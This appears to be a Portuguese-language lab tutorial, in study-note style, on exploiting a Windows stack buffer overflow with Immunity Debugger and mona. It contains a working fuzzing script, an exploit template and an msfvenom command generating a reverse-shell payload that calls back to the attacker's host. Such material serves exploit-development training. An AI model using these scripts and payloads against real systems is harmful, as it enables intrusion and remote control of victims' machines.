Execute o Immunity Debugger como administrador e carregue o executável que será explorado.

Configurar o caminho de saída do mona:
```powershell
!mona config -set workingfolder c:\mona\%p
```

Script para descobrir com quantos caracteres a aplicação quebra (**fuzzing.py**):
```python
#!/usr/bin/env python3

import socket, time, sys

ip = "MACHINE_IP"

port = 1337
timeout = 5
prefix = "OVERFLOW1 "

string = prefix + "A" * 100

while True:
  try:
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
      s.settimeout(timeout)
      s.connect((ip, port))
      s.recv(1024)
      print("Fuzzing with {} bytes".format(len(string) - len(prefix)))
      s.send(bytes(string, "latin-1"))
      s.recv(1024)
  except:
    print("Fuzzing crashed at {} bytes".format(len(string) - len(prefix)))
    sys.exit(0)
  string += 100 * "A"
  time.sleep(1)
```

Script para explorar a aplicação (**exploit.py**):
```python
import socket

ip = "MACHINE_IP"
port = 1337

prefix = "OVERFLOW1 "
offset = 0
overflow = "A" * offset
retn = ""
padding = ""
payload = ""
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")
```

Criar um padrão (pattern) para ser enviado na aplicação:
```bash
# 600 é a quantidade de caractéres
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 600
```
O padrão gerado deve ser utilizado na variável payload do exploit.py.

Identificar no mona qual o Offset de EIP:
```powershell
# 600 é a quantidade de caractéres gerado pelo pattern_create
!mona findmsp -distance 600
# Ex.: EIP contains normal pattern : ... (offset XXXX)
```
Para validar se é possível controlar o EIP defina o valor de retn do exploit.py para o offset encontrado e deixe o valor de payload vazio.

Gere uma bytearray com o mona:
```
!mona bytearray -b "\x00"
```

Gere os mesmos bytearray na máquina atacante:
```bash
for ((x=1; x<=255; x++)); do printf "\\\x%02x" $x; done > bytearray.txt
```
Utilize o bytearray gerado para identificar os Bad Chars da aplicação, substitua o payload do exploit.py pelo bytearray.

Para comparar os dois bytearrays gerados, utilize o mona com o endereço de ESP:
```
!mona compare -f C:\mona\oscp\bytearray.bin -a <address>
```

Ao identificar os bad chars, gere um novo bytearray com o mona, mas indicando quais são os bad chars:
```powershell
`!mona bytearray -b "\x00\x01\x02"`
```

Atualize também o bytearray que será enviado para remover os bad chars encontrados e atualize o payload de exploit.py.

Após fazer a remoção de todos os bad chars, vamos identificar os JMP ESP que podem ser gravados, lembrando de passar todos os badchars na consulta:
```powershell
!mona jmp -r esp -cpb "\x00\x01\x02"
```

Atualize a variavel retn do exploit.py para o endereço do JMP ESP identificado, lembrando que o mesmo deve ser escrito ao contrário, ex.: Se o endereço identificado é \\x01\\x02\\x03\\x04, deve ser escrito no payload: \\x04\\x03\\x02\\x01.

Gere um shell code pra pegarmos a shell reversa com o msfvenom:
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=YOUR_IP LPORT=4444 EXITFUNC=thread -b "\x00\x01\x02" -f c
```

Copie o shellcode gerado na variável payload do script exploit.py:
```python
# Exemplo
payload = ("\xfc\xbb\xa1\x8a\x96\xa2\xeb\x0c\x5e\x56\x31\x1e\xad\x01\xc3"  
"\x85\xc0\x75\xf7\xc3\xe8\xef\xff\xff\xff\x5d\x62\x14\xa2\x9d"  
...  
"\xf7\x04\x44\x8d\x88\xf2\x54\xe4\x8d\xbf\xd2\x15\xfc\xd0\xb6"  
"\x19\x53\xd0\x92\x19\x53\x2e\x1d")
```

Liberar mais espaço em memória para o payload tenha espaço para ser executado, inclua `"\x90" * 16` em padding no script exploit.py:
```python
# Exemplo
padding = "\x90" * 16
```

